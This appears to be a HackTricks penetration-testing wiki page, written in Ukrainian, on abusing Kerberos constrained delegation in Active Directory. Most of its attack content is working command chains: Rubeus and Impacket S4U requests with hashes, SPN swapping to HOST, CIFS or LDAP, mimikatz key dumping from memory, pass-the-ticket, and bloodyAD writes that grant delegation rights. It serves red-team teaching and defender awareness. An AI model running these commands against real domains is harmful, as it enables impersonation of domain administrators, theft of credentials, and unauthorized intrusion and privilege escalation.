# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

За допомогою цього Domain admin може **дозволити** комп'ютеру **імперсонувати користувача або комп'ютер** щодо будь-якої **служби** машини.

- **Service for User to self (_S4U2self_):** Будь-який **обліковий запис служби, якому належить SPN**, зазвичай може отримати TGS до себе від імені довільного користувача. Якщо обліковий запис також має [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) у _userAccountControl_, цей TGS буде **forwardable**, що й робить protocol transition безпосередньо корисним для **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** **Обліковий запис служби** може отримати TGS від імені користувача до SPN, перелічених у **msDS-AllowedToDelegateTo**. Evidence ticket, який використовується в S4U2Proxy, має бути **forwardable**-квитком до служби, якій делегують: або справжнім квитком від клієнта до служби, перехопленим у victim, або квитком, згенерованим за допомогою **S4U2Self + T2A4D**.

**Note**: Якщо користувача позначено як ‘_Account is sensitive and cannot be delegated_’ в AD або він є членом **Protected Users**, зазвичай ви **не зможете імперсонувати** його через constrained delegation. У сучасних доменах під час роботи з обліковими записами, для яких увімкнено delegation, надавайте перевагу матеріалу **AES**, а не припущенням, що доступний лише RC4.

Це означає, що якщо ви **скомпрометуєте hash служби**, то зможете **імперсонувати користувачів** і отримувати **доступ** від їхнього імені до будь-якої **служби** на зазначених машинах (можливий **privesc**).

Крім того, ви **отримаєте доступ не лише до служби, яку користувач може імперсонувати, а й до будь-якої служби**, оскільки SPN (ім'я служби, яке запитується) не перевіряється (у квитку ця частина не шифрується/підписується). Тому, якщо ви маєте доступ до **CIFS service**, ви також можете отримати доступ до **HOST service**, використовуючи, наприклад, прапорець `/altservice` у Rubeus. Та сама слабкість із підміною SPN використовується в **Impacket getST -altservice** та інших інструментах.

Також саме доступ до **LDAP service на DC** потрібен для використання **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Примітка оператора:** не покладайся лише на скриншоти **ADUC** або BloodHound під час перевірки **gMSA/sMSA**. Ці облікові записи часто приховують звичну вкладку Delegation, тому безпосередньо перелічуй raw-атрибути **`userAccountControl`** і **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs Kerberos-only constrained delegation

If the compromised account has **T2A4D**, зазвичай можна виконати повний ланцюжок **`S4U2Self -> S4U2Proxy`**, використовуючи лише ключ служби/TGT.

Якщо він має лише **`msDS-AllowedToDelegateTo`** (класичний режим **"Use Kerberos only"**), delegation усе ще можна зловживати, але evidence ticket для S4U2Proxy має бути **справжнім forwardable user-to-service ticket** для delegating service. На практиці це означає викрадення або перехоплення victim TGS із **LSASS/ccache** і передавання його на другий етап (`/tgs:` у Rubeus). **Нефорвардний** S4U2Self ticket **недостатній** для classic constrained delegation; якщо це ваш єдиний evidence ticket, перевірте [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).

### Cross-domain constrained delegation notes (2025+)

Починаючи з **Windows Server 2012/2012 R2**, KDC підтримує constrained delegation між domains/forests через розширення S4U2Proxy. Сучасні збірки (Windows Server 2016–2025) зберігають цю поведінку та додають два PAC SIDs для сигналізації про protocol transition:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) коли користувач пройшов автентифікацію звичайним способом.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) коли service підтвердив identity через protocol transition.

Очікуйте `SERVICE_ASSERTED_IDENTITY` всередині PAC, коли protocol transition використовується між domains, що підтверджує успішне виконання кроку S4U2Proxy.

### Impacket / Linux tooling (altservice & full S4U)

Останні версії Impacket (0.11.x+) надають той самий ланцюжок S4U та SPN swapping, що й Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Якщо ви надаєте перевагу спочатку підробити user ST (наприклад, маючи лише offline hash), використовуйте **ticketer.py** разом із **getST.py** для S4U2Proxy. **tgssub.py** також стане в пригоді, якщо у вас уже є робочий ccache і потрібно лише замінити service class для того самого хоста. Перегляньте відкриту проблему Impacket #1713, щоб дізнатися про поточні особливості (KRB_AP_ERR_MODIFIED, якщо forged ST не відповідає ключу SPN).

### Автоматизація налаштування delegation за допомогою облікових даних із низькими привілеями

Якщо ви вже маєте **GenericAll/WriteDACL** для computer або service account, можна віддалено встановити необхідні атрибути без RSAT за допомогою **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Це дає змогу побудувати шлях constrained delegation для privesc без привілеїв DA, щойно ви зможете записувати ці атрибути.

- Крок 1: **Отримайте TGT дозволеного сервісу**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Існують **інші способи отримати TGT ticket** або **RC4** чи **AES256** без отримання прав SYSTEM на комп’ютері, як-от Printer Bug і unconstrain delegation, NTLM relaying та зловживання Active Directory Certificate Service
>
> **Маючи лише цей TGT ticket (або його хеш), ви можете виконати цю атаку без компрометації всього комп’ютера.**

- Step2: **Отримати TGS для сервісу, видаючи себе за користувача**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Більше інформації на ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) та [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Посилання
- [Огляд Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Зловживання Delegation за допомогою Impacket (частина 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)

{{#include ../../banners/hacktricks-training.md}}
